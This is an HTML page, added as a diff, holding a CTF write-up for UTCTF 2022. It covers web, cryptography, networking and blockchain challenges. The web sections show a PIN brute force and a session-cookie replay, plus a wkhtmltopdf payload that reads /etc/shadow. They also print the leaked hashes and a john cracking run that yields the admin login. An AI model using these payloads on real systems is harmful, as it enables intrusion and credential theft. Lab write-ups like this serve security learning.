@@ -1,0 +1,365 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=manifest href=/site.webmanifest>
+<link rel=mask-icon href=/safari-pinned-tab.svg color=#282a36>
+<meta name=msapplication-TileColor content="#2d89ef">
+<meta name=theme-color content="#282a36">
+<title>
+Writeup: UTCTF 2022 - nevi.dev
+</title><link rel=stylesheet href="/styles.min.3ccabd29c465dc8134033adc11b0759d36344d8cc9a2e2c84a26673954537ae2.css" integrity="sha256-PMq9KcRl3IE0AzrcEbB1nTY0TYzJouLISiZnOVRTeuI=">
+<link rel=stylesheet href=/dist/katex/katex.min.f7808d67f6c9b70ac1619ad7842381be9078ad9533067bc0b22ac5bf7d53306a.css integrity="sha256-94CNZ/bJtwrBYZrXhCOBvpB4rZUzBnvAsirFv31TMGo=">
+<script defer src=/dist/katex/katex.min.6e023d5a12ce3d25253eb7601d4837acf201dafabe0fe9989144ccdead14f1fc.js integrity="sha256-bgI9WhLOPSUlPrdgHUg3rPIB2vq+D+mYkUTM3q0U8fw="></script>
+<script defer src=/dist/katex/contrib/auto-render.min.cb7f4ca60ed5dc3e258415f8c7a3b46d4a93578a52adf83011f18a7f190e7602.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" onload='renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})'></script>
+</head><body>
+<main>
+<article>
+<header>
+<h1>Writeup: UTCTF 2022</h1><time datetime=2022-03-14>2022-03-14</time>
+on <a href=/>nevi.dev</a>
+</header><ul>
+<li>Website: <a href=https://utctf.live/>https://utctf.live/</a></li><li>CTFTime: <a href=https://ctftime.org/event/1582>https://ctftime.org/event/1582</a></li></ul><h2 id=websockets-web>Websockets? (Web)</h2><blockquote>
+<p>Can you hack my website?</p><p>By Daniel Parks (@danielp on discord)</p><p><a href=http://web1.utctf.live:8651>http://web1.utctf.live:8651</a></p></blockquote><p>The employee login page (<code>/internal/login</code>) uses websockets to log in.</p><p>The JS source is as such:</p><pre tabindex=0><code>document.querySelector(&#34;input[type=submit]&#34;).addEventListener(&#34;click&#34;, checkPassword);
+
+function checkPassword(evt) {
+	evt.preventDefault();
+	const socket = new WebSocket(&#34;ws://&#34; + window.location.host + &#34;/internal/ws&#34;)
+	socket.addEventListener(&#39;message&#39;, (event) =&gt; {
+		if (event.data == &#34;begin&#34;) {
+			socket.send(&#34;begin&#34;);
+			socket.send(&#34;user &#34; + document.querySelector(&#34;input[name=username]&#34;).value)
+			socket.send(&#34;pass &#34; + document.querySelector(&#34;input[name=password]&#34;).value)
+		} else if (event.data == &#34;baduser&#34;) {
+			document.querySelector(&#34;.error&#34;).innerHTML = &#34;Unknown user&#34;;
+			socket.close()
+		} else if (event.data == &#34;badpass&#34;) {
+			document.querySelector(&#34;.error&#34;).innerHTML = &#34;Incorrect PIN&#34;;
+			socket.close()
+		} else if (event.data.startsWith(&#34;session &#34;)) {
+			document.cookie = &#34;flask-session=&#34; + event.data.replace(&#34;session &#34;, &#34;&#34;) + &#34;;&#34;;
+			socket.send(&#34;goodbye&#34;)
+			socket.close()
+			window.location = &#34;/internal/user&#34;;
+		} else {
+			document.querySelector(&#34;.error&#34;).innerHTML = &#34;Unknown error&#34;;
+			socket.close()
+		} 
+	})
+}
+</code></pre><p>We need to send a username and password (pin), and the server will send us a
+session cookie if we&rsquo;re successful. It also tells us when we have a valid user,
+which lets us guess the username (<code>admin</code>).</p><p>Inspecting the HTML source tells us that the password is probably just 3 digits:</p><pre tabindex=0><code>&lt;!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can&#39;t remember jack --&gt;
+&lt;input name=&#34;password&#34; type=&#34;password&#34; placeholder=&#34;PIN&#34; required pattern=&#34;(\d{3}|\d{16})&#34;&gt;
+</code></pre><p>All that&rsquo;s left is brute-force the password to obtain the session cookie.</p><pre tabindex=0><code>$ ./websockets 
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.on9k8zp5TonNvIRtXDxpV9I8KWRNPQHvPXd20DZE8hA
+$ curl -sS http://web1.utctf.live:8651/internal/user -b &#39;flask-session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.on9k8zp5TonNvIRtXDxpV9I8KWRNPQHvPXd20DZE8hA&#39; | grep utflag
+        utflag{w3bsock3ts}
+</code></pre><p><a href=websockets/websockets.go>websockets.go</a></p><h2 id=html2pdf-web>HTML2PDF (Web)</h2><blockquote>
+<p>My friend bet me I couldn&rsquo;t pwn this site. Can you help me break in?</p><p>(bruteforcing is not necessary or helpful to solve this problem)</p><p><em>by mattyp</em></p><p><a href=http://web2.utctf.live:9854>http://web2.utctf.live:9854</a></p></blockquote><p>The website renders HTML in the input form into PDFs. The placeholder contains
+an <code>&lt;img></code> to an external server that gets rendered, so we can try SSRF with
+something like <code>&lt;img src="http://&lt;our-server>"></code>. The challenge server sent us a
+request like so:</p><pre tabindex=0><code>GET / HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/9.0 Safari/602.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en,*
+Host: &lt;our-server&gt;
+</code></pre><p>The User-Agent header tells us that the server is using
+<a href=https://github.com/wkhtmltopdf/wkhtmltopdf/><code>wkhtmltopdf</code></a>. A quick issue search lands us on issue
+<a href=https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536>#4536</a>, which tells us that <code>wkhtmltopdf</code> will execute
+code and include remote files for us (if not configured correctly).</p><p>The server also seems to be running as root, since changing the payload in the
+issue slightly (<code>/etc/passwd</code> -> <code>/etc/shadow</code>) works, and the server gives us
+the password entries.</p><pre tabindex=0><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+
+&lt;body&gt;
+
+&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open(&#34;GET&#34;,&#34;file:///etc/shadow&#34;);
+x.send();
+&lt;/script&gt;
+
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><p>The server sends us the shadow entries, including the following:</p><pre tabindex=0><code>dave:$1$M.bfkUDw$jjybwVXMb4waSV0fY5gp0/:19062:0:99999:7:::
+john:$1$EPS/Rl3g$5TLupCmddYSibyDaZtZhQ0:19062:0:99999:7:::
+emma:$1$iasayt59$U1QnVGaDEJKyps3iHWv2P1:19062:0:99999:7:::
+WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::
+</code></pre><p>The last entry (<code>WeakPasswordAdmin</code>) seems promising, and in fact we can crack
+it very quickly with a password cracker.</p><pre tabindex=0><code>$ john &lt;(echo &#39;WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::&#39;)
+Loaded 1 password hash (md5crypt [MD5 32/64 X2])
+Warning: OpenMP is disabled; a non-OpenMP build may be faster
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+sunshine         (WeakPasswordAdmin)
+1g 0:00:00:00 100% 2/3 6.250g/s 11618p/s 11618c/s 11618C/s 123456..franklin
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Finally, we can use the cracked credentials to obtain the flag.</p><pre tabindex=0><code>$ curl -sS http://web2.utctf.live:9854/admin -F username=WeakPasswordAdmin -F password=sunshine | grep utflag
+      &lt;p style=&#34;color:red&#34;&gt;&lt;b&gt;utflag{b1g_r3d_t3am_m0v35_0ut_h3r3}&lt;/p&gt;
+</code></pre><h2 id=failed-hash-function-cryptography>Failed Hash Function (Cryptography)</h2><blockquote>
+<p>I made this keyed hash function for my final project, but I got a 0&mldr;
+Apparently, there&rsquo;s too many collisions and you can recover the key after one
+hash. I don&rsquo;t believe it. In fact, if you can break my hash function 100
+times, I&rsquo;ll give you a flag! I&rsquo;ll even be nice &ndash; you get two whole guesses to
+find the key. By oops (@oops on discord)</p><p><code>nc misc1.utctf.live 5000</code></p><p><a href=failed-hash-function/main.py>main.py</a></p></blockquote><p>We need to guess <code>k1</code> and <code>k2</code>, two random bytes, given the output of a hash
+function that we can query twice with 16 bytes. The hash function is like so:</p><pre tabindex=0><code>def print_hash(s):
+    for x in s:
+        for y in s:
+            print(hex(trailing((k1 ^ x) * (k2 ^ y)))[2:], end=&#39;&#39;)
+</code></pre><p>For each pair of positions in the 16-byte input, it xors the first part with
+<code>k1</code>, the second part with <code>k2</code>, and multiplies them together, outputting the
+number of trailing zero bits in the product.</p><p>Here, we remember how the number of trailing zero bits of a product $a \times b$
+is equal to the sum of the number of trailing zeroes in $a$ and $b$. In short,
+each number in the hash function reveals the number of matching trailing
+bits we have in our input.</p><p>Since we can make two queries, we can try to guess the 4 low-order bits of each
+key on the first attempt, and the 4 high-order bits on the second attempt.</p><p>The solution is as follows:</p><ol>
+<li>Try to obtain information on the 4 low-order bits by sending every single
+combination of the 4 low-order bits (<code>0x000102030405060708090a0b0c0d0e0f</code>).</li><li>Given the hash output, compute every single possible value of <code>k1</code> and <code>k2</code>
+that could produce that output. We are guaranteed to have fewer than 16
+possible values, because the $2^{8-4} = 16$.</li><li>For the second attempt, send every possible value of <code>k1</code> and <code>k2</code> we
+obtained in the previous step. We are guaranteed to obtain a single result.</li></ol><p>Since step 2 (computing $2^{16}$ hash values) can be slow (a few seconds), we
+can speed things up by precomputing key values for each possible hash output of
+<code>0x000102030405060708090a0b0c0d0e0f</code>.</p><pre tabindex=0><code>$ ./solve.py 
+[+] Precomputing...: Done
+[+] Opening connection to misc1.utctf.live on port 5000: Done
+[+] Solving...: Done
+[+] Receiving all data: Done (80B)
+[*] Closed connection to misc1.utctf.live port 5000
+[+] Dang... guess it really is broken :(
+    utflag{Ju5t_u53_SHA256_LoLc4t5_9a114be7f}
+</code></pre><p><a href=failed-hash-function/solve.py>solve.py</a></p><h2 id=sunset-cryptography>Sunset (Cryptography)</h2><blockquote>
+<p>subset sumset what did i do Wrap the value of key with utflag{} for the flag. By oops (@oops on discord)</p><p><a href=sunset/main.py>main.py</a> <a href=sunset/output.py>output.txt</a></p></blockquote><p>We are provided two public keys and some removed values, and we must find the
+hash of some shared key generated between these two keypairs.</p><p>Inspecting the code, the algorithm is as follows:</p><pre tabindex=0><code>def get_secret_key():
+    key = []
+    for i in range(1, N):
+        x = random.randrange(1,10)
+        key += [i] * x
+    random.shuffle(key)
+    return key
+</code></pre><p>The private key is generated by generating a random (1-9) number of each number
+from 1 to <code>N-1</code> (110). This list is then shuffled, but as we will find out
+later, the shuffling does not affect the results in any way.</p><pre tabindex=0><code>def compute_arr(arr, sk):
+    for x in sk:
+        new_arr = arr.copy()
+        for y in range(N):
+            new_arr[(x+y)%N] += arr[y]
+            new_arr[(x+y)%N] %= MOD
+
+        arr = new_arr
+    return arr
+
+def compute_public_key(sk):
+    arr = [0] * N
+    arr[0] = 1
+    return compute_arr(arr, sk)
+</code></pre><p>It then generates the public key. To do this, the it starts with an array of
+length <code>N</code> with all zeroes except the first item, which is 1. Then, it calls
+<code>compute_arr</code> with this array and the private key. <code>compute_arr</code> then steps
+through each key value <code>k</code>, such that <code>next[i] = prev[i] + prev[i-k % N] % 1000000007</code>.</p><pre tabindex=0><code>remove_elements = random.sample(range(1,N), 20)
+
+for x in remove_elements:
+    A_sk.remove(x)
+    B_sk.remove(x)
+
+A_shared = compute_arr(B_pk, A_sk)
+B_shared = compute_arr(A_pk, B_sk)
+
+assert(A_shared == B_shared)
+</code></pre><p>Then, the key exchange: it first chooses 20 values to delete from
+both secret keys, and then calls <code>compute_arr(pk_a, sk_b)</code> and vice versa. This
+somehow results in the same shared key for both Alice and Bob, which is then
+hashed to obtain the key.</p><p>The challenge output contains the two public keys, the list of removed elements,
+but not the key (our flag). In essence, we need to obtain
+<code>compute_arr(compute_arr([1, 0, ..., 0], sk_a), remove_some_elements(sk_b))</code>.</p><p>To begin solving the challenge, we think about what <code>compute_arr</code> is doing: It
+is perfoming one step per secret key value, where it produces <code>arr + rotate_left(arr, sk)</code> each step.</p><blockquote>
+<p>Warning, bad $\TeX$ follows. I apologise for the garbage notation in advance&mldr;</p></blockquote><p>In other words, with secret key $SK = [a, b]$ and initial array $A_0$,</p><p>$$
+\begin{equation*}
+\begin{aligned}
+A_1[i] & = A_0[i] + A_0[i-a] \\
+A_2[i] & = A_1[i] + A_1[i-b] \\
+& = ( A_0[i] + A_0[i-a] ) + ( A_0[i-b] + A_0[i-b-a] ) \\
+& = A_0[i] + A_0[i-a] + A_0[i-b] + A_0[i-a-b] \\
+\end{aligned}
+\end{equation*}
+$$</p><p>(All addition is $\operatorname{mod} 10^9+7$ and indexing $\operatorname{mod} N$, omitted for brevity.)</p><p>Notice how the value of $A_2[i]$ does not depend on the order of $SK$. In fact,
+the order of elements in $SK$ does not affect the result of <code>compute_arr</code> at
+all, which is why the shuffle during key generation is meaningless.</p><p>Another way to think about <code>compute_arr</code> is with matrix multiplication. For
+example, with $N = 3$, $SK = [1, 2]$, and initial array $A_0$,</p><p>$$
+\begin{equation*}
+\begin{aligned}
+A_1 & = K_{SK[1]} A_0 \\
+A_2 & = K_{SK[2]} A_1 \\
+\end{aligned}
+\end{equation*}
+$$</p><p>Where</p><p>$$
+\begin{equation*}
+\begin{aligned}
+K_1 & =
+I_3 +
+\begin{pmatrix}
+0 & 0 & 1 \\
+1 & 0 & 0 \\
+0 & 1 & 0 \\
+\end{pmatrix}
+=
+\begin{pmatrix}
+1 & 0 & 1 \\
+1 & 1 & 0 \\
+0 & 1 & 1 \\
+\end{pmatrix}
+\\
+K_2 & =
+I_3 +
+\begin{pmatrix}
+0 & 1 & 0 \\
+0 & 0 & 1 \\
+1 & 0 & 0 \\
+\end{pmatrix}
+=
+\begin{pmatrix}
+1 & 1 & 0 \\
+0 & 1 & 1 \\
+1 & 0 & 1 \\
+\end{pmatrix}
+\\
+\end{aligned}
+\end{equation*}
+$$</p><p>Here, $K_j$ is the the identity matrix plus the identity matrix columns rotated
+to the left by $j$, and represents a single <code>compute_arr</code> step with key value
+$SK[i] = j$.</p><p>Therefore, <code>compute_arr(a, sk)</code> is equivalent to</p><p>$$
+\mathtt{compute\_arr} (A, SK) = ( \prod_{i = 1}^{|SK|} K_{SK[i]} ) A
+$$</p><p>Also, notice that each $K_j$ matrix is invertible. This means that given $A_i$
+and $SK_i$, we can compute the inverse for <code>compute_arr</code>:</p><p>$$
+\mathtt{compute\_arr}^{-1} (A, SK) = ( \prod_{i = 1}^{|SK|} K_{SK[i]}^{-1} ) A
+$$</p><p>Now, we can understand how the challenge code results in the same values for
+both Alice and Bob. With Alice&rsquo;s and Bob&rsquo;s secret keys as $SK_A$ and $SK_B$,
+respectively, the public keys are</p><p>$$
+\begin{equation*}
+\begin{aligned}
+PK_A & = \mathtt{compute\_arr}(A_0, SK_A) \\
+PK_B & = \mathtt{compute\_arr}(A_0, SK_B) \\
+\end{aligned}
+\end{equation*}
+$$</p><p>Then, the algorithm removes some values $R$ to produce $SK^\prime_{A}$ and
+$SK^\prime_{B}$, and computes</p><p>$$
+\begin{equation*}
+\begin{aligned}
+Shared_A & = \mathtt{compute\_arr}(PK_B, SK^\prime_{A}) \\
+Shared_B & = \mathtt{compute\_arr}(PK_A, SK^\prime_{B}) \\
+\end{aligned}
+\end{equation*}
+$$</p><p>However, since (for our matrices) matrix multiplications are commutative, we can
+rearrange terms like so:</p><p>$$
+\begin{equation*}
+\begin{aligned}
+Shared_A & = \mathtt{compute\_arr}(PK_B, SK^\prime_{A}) \\
+& = \mathtt{compute\_arr}(PK_B, SK^\prime_{A}) \\
+& = ( \prod_{i = 1}^{|SK^\prime_{A}|} K_{SK^\prime_{A}[i]} ) PK_B \\
+& = ( \prod_{i = 1}^{|SK^\prime_{A}|} K_{SK^\prime_{A}[i]} )
+( \prod_{i = 1}^{|SK_B|} K_{SK_B[i]} ) A_0 \\
+& = ( \prod_{i = 1}^{|SK_B || SK^\prime_A|} K_{SK_B || SK^\prime_A [i]} ) A_0 \\
+& = \mathtt{compute\_arr}(A_0, SK_B || SK^\prime_A) \\
+& = \mathtt{compute\_arr}^{-1}(\mathtt{compute\_arr}(A_0, SK_B || SK_A), R) \\
+\end{aligned}
+\end{equation*}
+$$</p><p>Remember that $SK^\prime_A$ is just $SK$ without some elements $R$, so, we can
+&ldquo;factor out&rdquo; the $R$ like so:</p><p>$$
+\begin{equation*}
+\begin{aligned}
+Shared_A & = \mathtt{compute\_arr}(A_0, SK_B || SK^\prime_A) \\
+& = \mathtt{compute\_arr}^{-1}(\mathtt{compute\_arr}(A_0, SK_B || SK_A), R) \\
+\end{aligned}
+\end{equation*}
+$$</p><p>This value is the same for $Shared_B$, which is why this key exchange results in
+the same values for both Alice and Bob.</p><p>Now, all we need to do to solve the challenge is construct a
+$\mathtt{merge\_arr}$ such that</p><p>$$
+\begin{equation*}
+\begin{aligned}
+PK_A &= \mathtt{compute\_arr}(A_0, SK_A) \\
+PK_B &= \mathtt{compute\_arr}(A_0, SK_B) \\
+\mathtt{merge\_arr}(PK_A, PK_B) & = \mathtt{compute\_arr}(A_0, SK_A || SK_B) \\
+\end{aligned}
+\end{equation*}
+$$</p><p>Remember how</p><p>$$
+A_2[i] = A_0[i] + A_0[i-a] + A_0[i-b] + A_0[i-a-b]
+$$</p><p>From this, it seems that the value of $A_2[i]$ equals the sum of $A_0[i -
+(\textrm{every combination of up to 2 values in} \ SK)$. Indeed,</p><p>$$
+\mathtt{compute\_arr}(A, SK)[i] = \sum A_0[i - (\textrm{every combination of
+values in} \ SK)]
+$$</p><p>Since $A_0 = [1, 0, \cdots, 0]$ (that is, only $A_0[0]$ is non-zero), this is
+the same as the number of cases in which a combination of values in $SK$ sums to
+$i$. we can now construct $\mathtt{merge\_arr}$ as such:</p><p>$$
+\begin{equation*}
+\begin{aligned}
+PK_A[i] &= \textrm{number of times a combination of values in} \ SK_A \ \textrm{sums to} \ i \\
+PK_B[j] &= \textrm{number of times a combination of values in} \ SK_B \ \textrm{sums to} \ j \\
+\mathtt{merge\_arr}(PK_A, PK_B)[k] & = \textrm{number of times a combination of values in} \ SK_A || SK_B \ \textrm{sums to} \ k \\
+& = \sum PK_A[i] \cdot PK_B[j] \ (\textrm{whenever} \ i+j = k) \\
+\end{aligned}
+\end{equation*}
+$$</p><p>Take it all together, implement and evalute
+$\textrm{compute\_arr}^{-1}(\textrm{merge\_arr}(PK_A, PK_B), R)$ to obtain
+the flag, being careful about overflows and operations $\operatorname{mod}
+10^9+7$.</p><pre tabindex=0><code>$ ./solve.py 
+3f3ae3284970df318be8404747bb003fe47cd9bdbb57fc1da52a01b3c028180f
+</code></pre><p><a href=sunset/solve.py>solve.py</a></p><h2 id=malformed-query-networking>Malformed Query (Networking)</h2><blockquote>
+<p>I was looking at my network traffic, and found some interesting packets that
+seem to malformed. Can you figure out what&rsquo;s going on?</p><p>by mattyp</p><p><a href=malformed-query/capture.pcapng>capture.pcapng</a>
+<a href=malformed-query/server.go>server.go</a></p></blockquote><p>Inspecting the capture, most of the traffic is encrypted HTTPS, and some DNS
+queries. However, there is some some interesting UDP traffic over port 9855.</p><pre tabindex=0><code> tshark -r capture.pcapng &#39;udp.port==9855&#39;
+   61   5.402771 192.168.0.79 → 3.93.213.98  UDP 69 63009 → 9855 Len=27
+   62   5.443228  3.93.213.98 → 192.168.0.79 UDP 554 9855 → 63009 Len=512
+   63   5.443899 192.168.0.79 → 3.93.213.98  UDP 322 63009 → 9855 Len=280
+   64   5.489225  3.93.213.98 → 192.168.0.79 UDP 1106 9855 → 63009 Len=1064
+</code></pre><p>If we look closely, it turns out it&rsquo;s a DNS-like protocol, with the first two
+entries (61 and 62) corressponding to a <code> publickey. IN TXT</code> request and the
+server responding with a public key (which happens to be malformed, the PEM
+header should be <code>BEGIN PUBLIC KEY</code> and not <code>BEGIN RSA PUBLIC KEY</code>).</p><p>The next two entries contain malformed DNS data, and looking at the server code
+reveals that the client is sending an RSA-OAEP encrypted query containing a
+command, to which the server responds with the command output, in this case
+being a directory listing.</p><p>A quick check reveals that the server is still active:</p><pre tabindex=0><code>$ drill @3.93.213.98 -p 9855 publickey txt
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, rcode: NOERROR, id: 8149
+;; flags: qr rd ra ; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0 
+;; QUESTION SECTION:
+;; publickey.   IN      TXT
+
+;; ANSWER SECTION:
+publickey.      4919    IN      TXT     &#34;-----BEGIN RSA PUBLIC KEY-----\010MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyljjH5MViK9eDX3TYlO8\010Cei+rVufA+lrsw36gv/Ntv34PBXebZBC8BSwy/t0jMHnn7+9fY0zum9sMwV7A7R9\0103RWt5WppeqPyhuFNlM8DoGN5RLjTVLLKvSG2df5c8IktfDpjdrgUYDOiMMN7ANVE\010yIK+Nt+RBoGK2fkKk3NljlmmXKKP&#34;
+publickey.      4919    IN      TXT     &#34;U2yQZX6uHgMPXk1QSvXRsPcdWG255dBhVXK/\010rB2vAMOsD2QDMiUEa5KFgDxoBT3CH1H2nPCcXGux2j+gCpxyzzSdWrdxw64xmcGm\010rYWyC/lEygNDYc82JQJatHJSeDmz1TeA6LoY29QnKzSfrOZNvRxaB9NbbY7s9zRS\010JwIDAQAB\010-----END RSA PUBLIC KEY-----\010&#34;
+
+;; AUTHORITY SECTION:
+
+;; ADDITIONAL SECTION:
+
+;; Query time: 218 msec
+;; SERVER: 3.93.213.98
+;; WHEN: Mon Mar 14 07:55:00 2022
+;; MSG SIZE  rcvd: 512
+</code></pre><p>So all we need to do is retrieve the public key, send an encrypted (and
+malformed) query to this server with a command like <code>cat flag.txt</code>, and read out
+the response. Unfortuantely, we could not find any libraries or tools that
+would allow us to send malformed DNS messages, so we glued something together by
+referencing the server source code.</p><pre tabindex=0><code>$ ./malformed 
+utflag{i_love_me_some_spicy_dns}
+</code></pre><p><a href=malformed-query/malformed.go>malformed.go</a></p><h2 id=the-grumpy-genie-misc>The Grumpy Genie (Misc)</h2><blockquote>
+<p>Someone wrote an nft collection for UT, though its quite a mess and theres all
+this talk about a genie and Silvio Micali being the real satoshi</p><p>0x867D66C78235CD6c989FbFA34606FcfF637fB613</p><p><a href=https://pastebin.com/T7r9vFvg>https://pastebin.com/T7r9vFvg</a></p><p>By Theo (@Raoul Duke on discord)</p></blockquote><p>The linked pastebin contains code for a smart contract, but it doesn&rsquo;t seem
+useful.</p><p>Searching for the address leads to <a href=https://bscscan.com/address/0x867D66C78235CD6c989FbFA34606FcfF637fB613>BcsScan</a>, with no
+transactions. However, this address is also used on the &ldquo;Ropsten Testnet&rdquo;, which
+is slightly more useful.</p><p>On <a href=https://ropsten.etherscan.io/address/0x867D66C78235CD6c989FbFA34606FcfF637fB613>Etherscan</a>, we find one
+<a href=https://ropsten.etherscan.io/tx/0xca78d2d51101fda93f3f8c62f4349dd23a7e5692cef667ab834c3611601f068f>transaction</a>. This transaction has some input, from which we
+can extract the flag (near the end).</p><pre tabindex=0><code>$ wl-paste | xxd -r -p | strings | grep utflag
+utflag{Did_Y0u_USe_Re3nTrancY?}
+</code></pre></article></main><footer>
+<hr>
+<small><a href=mailto:nevivurn@nevi.dev>email</a> | <a href=https://github.com/nevivurn>github</a><br>
+Content on this site is <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a>.</small>
+</footer></body></html>
